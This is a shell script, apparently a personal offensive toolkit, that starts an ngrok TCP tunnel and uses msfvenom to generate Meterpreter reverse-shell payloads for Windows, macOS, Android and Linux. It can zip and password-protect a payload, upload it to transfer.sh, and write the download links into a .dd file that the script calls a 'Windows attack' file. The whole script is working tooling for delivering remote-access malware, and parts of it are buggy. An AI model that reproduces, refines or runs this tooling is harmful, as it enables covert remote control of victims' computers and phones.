#!/bin/sh
TEMPFILE=$HOME/msf/tmp/.temp_ip_ngrok-tcp.txt

#PORT=$(cat $TEMPFILE |  cut -d ':' -f2)
PORT=5656
IP=$(cat $TEMPFILE | sed 's/\:.*//')
RANDOMLETTER=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 5)
ARCHIVE="$HOME/msf/tmp/reverse-$RANDOMLETTER.zip"
TEMP="$HOME/msf/tmp"
DDFILE="$HOME/msf/dd/payload_sample.dd"
DDFILEENCRYPTED="$HOME/msf/dd/payload_sample_e.dd"
OLDLINK=$(cat ~/msf/tmp/old_link.txt)
NEWLINK=$(cat ~/msf/tmp/new_link.txt)
catngrok=$(cat $TEMPFILE)
#FOLDER_USEFUL="storage/emulated/0/utiles/payload.dd"
FOLDER_USEFUL="/root/msf/utiles"



touch $TEMPFILE

echo "\033[1;32m____    ____  ___       __  ___      ___      .__   __.  _______   __  
\   \  /   / /   \     |  |/  /     /   \     |  \ |  | |       \ |  | 
 \   \/   / /  ^  \    |  '  /     /  ^  \    |   \|  | |  .--.  ||  | 
  \      / /  /_\  \   |    <     /  /_\  \   |  . \`  | |  |  |  ||  | 
   \    / /  _____  \  |  .  \   /  _____  \  |  |\   | |  '--'  ||  | 
    \__/ /__/     \__\ |__|\__\ /__/     \__\ |__| \__| |_______/ |__| 
                                                                       
 __    __       _______. _______  _______  __    __   __               
|  |  |  |     /       ||   ____||   ____||  |  |  | |  |              
|  |  |  |    |   (----\`|  |__   |  |__   |  |  |  | |  |              
|  |  |  |     \   \    |   __|  |   __|  |  |  |  | |  |              
|  \`--'  | .----)   |   |  |____ |  |     |  \`--'  | |  \`----.         
 \______/  |_______/    |_______||__|      \______/  |_______|         
                                                                       
.___________.  ______     ______    __          _______.               
|           | /  __  \   /  __  \  |  |        /       |               
\`---|  |----\`|  |  |  | |  |  |  | |  |       |   (----\`               
    |  |     |  |  |  | |  |  |  | |  |        \   \                   
    |  |     |  \`--'  | |  \`--'  | |  \`----.----)   |                  
    |__|      \______/   \______/  |_______|_______/                   
                                                                       
\033[0m"
echo "\033[1;34m \nIf have already have a ngrok server running to you want to kill it or not?\n(Tips: you should run ngrok on yourself before running this script, to put it in the background do >ngrok tcp 5656 > /dev/null &<\033[0m"
echo "\033[1;34m \nType \033[1;32m y \033[0m\033[1;34m for yes, \033[1;32m n \033[0m\033[1;34m for no, then press ENTER\033[0m"
read ngrok_choice
if [ $ngrok_choice = "y" ]; then
	curl -s localhost:4040/api/tunnels | jq -r .tunnels\[0\].public_url 
	pkill ngrok
	pkill ngrok
	sleep 2s
	echo "NGROK RANDOM SERVER TCP IS STARTING..."
	ngrok tcp $PORT > /dev/null &
else
	echo "This server below is already running, the script will use it : "
	curl -s localhost:4040/api/tunnels | jq -r .tunnels\[0\].public_url 
fi
#Waiting for ngrok
{
        i=0
        while [ $i -ne 100 ] && [ -z $(grep '[^[:space:]]' $TEMPFILE) ]
        do
                i=$(($i+1))
                echo "$i"
		echo "$(curl -s localhost:4040/api/tunnels | jq -r .tunnels\[0\].public_url)" > $TEMPFILE
                sleep 0.2
        done
} | whiptail --backtitle "Vakandi Useful Tools" --title "Checking if the server is started and stable..." --gauge "Please wait until ngrok server has been checked, this windows will disapear automatically after the script found the ngrok server online & stable" 8 50 0
#Waiting for ngrok
if [ -z $(grep '[^[:space:]]' $TEMPFILE) ]; then
	echo "\033[1;32m \nNGROK SERVER FAILED TO START..\nEXITING...\033[0m"
	exit
fi
#macos check
#echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
#linux check
sleep 3s
ngrok_link="$(curl -s localhost:4040/api/tunnels | jq -r .tunnels\[0\].public_url)"
echo "$ngrok_link" > $TEMPFILE
sleep 1s
echo "\n\n"
echo "The file\033[1;32m $TEMPFILE \033[0m has been created to store the IP & PORT address of your ngrok server"

IP=$(cat $TEMPFILE|cut -c7-| sed 's/\:.*//')
name_linux="$(date +%Y_%m_%d_%HH%M)-$(echo $ngrok_link| cut -c7- |sed "s#:#-port#g")"
FILE=reverse-$name_linux


sleep 1
echo "\033[1;32m \nPayload Options:\033[0m"
sleep 1
#echo "LHOST PAYLOAD: \033[1;34m$IP\033[0m \nLPORT PAYLOAD: \033[1;34m$PORT\033[0m"
echo "LHOST PAYLOAD: \033[1;34m$(echo $ngrok_link| cut -c7-| sed 's/\:.*//')\033[0m \nLPORT PAYLOAD: \033[1;34m$PORT\033[0m"
sleep 1

echo "\033[1;33m:::: WHICH PLATFORM YOU WANT THE PAYLOAD TO RUN ON?\033[0m"
echo "\033[1;33m:::: Type "w" for WINDOWS(.exe)\033[0m"
echo "\033[1;33m:::: Type "m" for MACOSX(.app)\033[0m"
echo "\033[1;33m:::: Type "a" for ANDROID(.apk)\033[0m"
echo "\033[1;33m:::: Type "l" for LINUX(.sh)\033[0m"




read payload_choice
if [ $payload_choice = "w" ]; then
	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$(echo $ngrok_link| cut -c7-| sed 's/\:.*//') LPORT=$PORT --smallest -f exe > $TEMP/$FILE.exe
	FILE="reverse-$name_linux.exe"
	echo "\033[1;34m::::Payload ready ::::\033[0m"
	echo "\033[1;34m::::You choose Windows EXE format::::\033[0m"
	DDFILEENCRYPTED="$HOME/msf/dd/payload_sample_encrypted_windows.dd"
fi
if [ $payload_choice = "m" ]; then
	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
	msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f osx-app > $TEMP/$FILE.app
	FILE="reverse-$name_linux.app"
	echo "\033[1;34m::::Payload ready ::::\033[0m"
	echo "\033[1;34m::::You choose MacOSX APP format::::\033[0m"
	DDFILEENCRYPTED="$HOME/msf/dd/payload_sample_encrypted_mac.dd"
fi
if [ $payload_choice = "a" ]; then
	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
	msfvenom -p android/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > $TEMP/$FILE.apk
	FILE="reverse-$name_linux.apk"
	echo "\033[1;34m::::Payload ready ::::\033[0m"
	echo "\033[1;34m::::You choose Android APK Format::::\033[0m"
	DDFILEENCRYPTED="$HOME/msf/dd/payload_sample_encrypted_android.dd"
fi

if [ $payload_choice = "l" ]; then
	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
	msfvenom -p linux/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > $TEMP/$FILE.sh
	FILE="reverse-$name_linux.sh"
	echo "\033[1;34m::::Payload ready ::::\033[0m"
	echo "\033[1;34m::::You choose Linux APK Format::::\033[0m"
	DDFILEENCRYPTED="$HOME/msf/dd/payload_sample_encrypted_linux.dd"
fi


if [ $payload_choice != "a" ] && [ $payload_choice != "m" ] && [ $payload_choice != "w" ] && [ $payload_choice != "l" ]; then
	echo "\033[1;33mYou didn't choose one of the three formats\nQuitting now.. \033[0m"
	exit
fi


LINKFILE=$HOME/msf/tmp/link-$(echo $ngrok_link| cut -c7- |sed "s#:#-port#g").txt


echo "\n::::Name of the payload:"
echo "\033[1;32m $FILE  \033[0m"
echo "::::Copying the payload in $FOLDER_USEFUL folder... :\n"
cp $TEMP/$FILE $FOLDER_USEFUL
echo "\033[1;32m$(ls $FOLDER_USEFUL/$FILE)\033[0m"

echo "\033[1;33m\n:::: DO YOU WANT TO UPLOAD AND ENCRYPT YOUR PAYLOAD ON TRANSFER.SH? \n:::: Type "y" for UPLOAD\n:::: Type "yy" for UPLOAD & ENCRYPT\033[0m\033[1;32m(Alpha version soon)\033[0m\033[1;33m\n:::: or press ENTER for none of that\n\033[0m"




ENCRYPTEDFILE="file$(date +%Y_%m_%d_%HH%M)-$(echo $ngrok_link| cut -c7- |sed "s#:#-port#g").zip"
read UPLOAD_choice

if [ $UPLOAD_choice = "yy" ]; then
	echo "\033[1;32m:::: Type the encrypted password ::: \033[0m"
	read password_zip
	echo "\033[1;32m:::: Encrypting using zip ... ::: \033[0m"
	zip -P $password_zip $HOME/msf/tmp/$ENCRYPTEDFILE -r $TEMP/$FILE
	echo "the encrypted file is here : $ENCRYPTEDFILE"
	echo "\033[1;32m:::: Uploading the zip ... ::: \033[0m"
	curl --upload-file $HOME/msf/tmp/$ENCRYPTEDFILE https://transfer.sh/reverse.zip > $LINKFILE
	echo "\033[1;32m:::: Uploading the file into transfer.sh ... \033[0m"
	echo "\033[1;32m:::: Remember: To download the payload you need to use gpg in your command, like this: \n$ zip -d $FILE\033[0m"
	echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder\n:::: The direct https link to the payload will be in it\033[0m"
	echo "\033[1;42m::::DONE\033[0m"
	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
fi
if [ $UPLOAD_choice = "y" ]; then
	echo "\033[1;42m:::: Uploading the file into transfer.sh ... \033[0m"
	zip $ARCHIVE -r $TEMP/$FILE
	curl --upload-file $ARCHIVE https://transfer.sh/reverse.zip > $LINKFILE
	echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder\n:::: The direct https link to the payload will be in it\033[0m"
	echo "\033[1;42m::::DONE\033[0m"
	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
fi

LINK7ZIP="$HOME/msf/tmp/link-$(echo $ngrok_link| cut -c7- |sed "s#:#-port#g")-unzip.txt"
#Needs to check if Windows unzip.exe in tmp folder as the right parameters in the dd file
#
if [ $password_zip = "" ]; then
	continue
else
	echo "uploading the unzip.exe needed for unecrypted the zip archive"
	curl --upload-file $TEMP/unzip.exe https://transfer.sh/unzip.exe > $LINK7ZIP
	link_unzipexe="$(cat $LINK7ZIP)"
	echo "\033[1;31m\n:::: LINK of unzip.exe :::: $link_unzipexe ::::\033[0m"
	echo "::::The .dd file is creating .."
	rm -f $FOLDER_USEFUL/payload.dd
	cp $DDFILEENCRYPTED $FOLDER_USEFUL/payload.dd
	
	echo "\033[1;33m\n::::::: DEBUG LOG ::::::::::\033[0m"
	link_zip_payload="$(cat $LINKFILE)"
	echo "\033[1;33m\n:::: BEFORE :::::\033[0m"
	echo "Variable to put in python script :"
	echo "Link of zip payload : $link_zip_payload"
	echo "Archive Password : $password_zip"
	echo "Link unzip.exe : $link_unzipexe"

	link_zip_payload="$(echo $link_zip_payload | sed -n 's/.*\.sh\/\(.*\)\/reverse\.zip/\1/p')"
	
	link_unzipexe="$(echo $link_unzipexe | sed -n 's/.*\.sh\/\(.*\)\/unzip\.exe/\1/p')"

	echo "\033[1;33m\n:::: AFTER ::::\033[0m"
	echo "Variable to put in python script :"
	echo "Link of zip payload : $link_zip_payload"
	echo "Archive Password : $password_zip"
	echo "Link unzip.exe : $link_unzipexe"
	python $HOME/msf/script/replace.py "$link_zip_payload" "$pasword_zip" "$link_unzipexe" $FOLDER_USEFUL/payload.dd
	echo "::::The links have been changed:::::"
	echo "::::The archive password has been added to the .dd file (if you encrypt the payload)"
	echo "\033[1;33m\n::::::: DEBUG LOG DONE ::::::::::\033[0m"
fi
echo "\033[1;33m\n:::: If you have upload the payload check this:\n:::: If there is no new link, the upload failed \033[0m"
echo "\nold link: \033[1;32m $(cat $HOME/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
echo "new link:\033[1;32m $(cat $FOLDER_USEFUL/payload.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
echo "$(cat $DDFILE | grep -Eo 'http.*.exe' | cut -d' ' -f1)" > $TEMP/old_link.txt
echo "$(cat $LINKFILE)" > $TEMP/new_link.txt

if [ "$OLDLINK" = "$NEWLINK" ]; then
	echo "\033[1;31m Failed to change the link in the .dd file \033[0m"
else
	echo "\033[1;32m\n:::: SUCCESS, PAYLOAD.DD CREATED AND STORED here :"
	ls $FOLDER_USEFUL/payload.dd
	echo "\033[1;32m\n:::: Remember, .dd file are only for Windows attack, not yet MacOS or Android"
fi

echo "$(cat $DDFILE | grep -Eo 'http.*.exe' | cut -d' ' -f1)" > $TEMP/old_link_zip.txt
echo "$(cat $LINKFILE)" > $TEMP/new_link_zip.txt

OLDLINK_ZIP=$(cat ~/msf/tmp/old_link_zip.txt)
NEWLINK_ZIP=$(cat ~/msf/tmp/new_link_zip.txt)
if [ "$OLDLINK_ZIP" = "$NEWLINK_ZIP" ]; then
	echo "\033[1;31m Failed to change the link of unzip.exe in the .dd file \033[0m"
else
	echo "\033[1;32m\n:::: Unzip.exe link has been added succesfully"
fi




echo "\033[1;35m\n:::: Do you want to open the link ? (for QR CODE or Sharing)\nType y for YES, or press Enter to Leave\n (Only available on Termux)\033[0m"
read openlink
if [ "$openlink" = "y" ]
then
	termux-open-url $NEWLINK
fi
exit


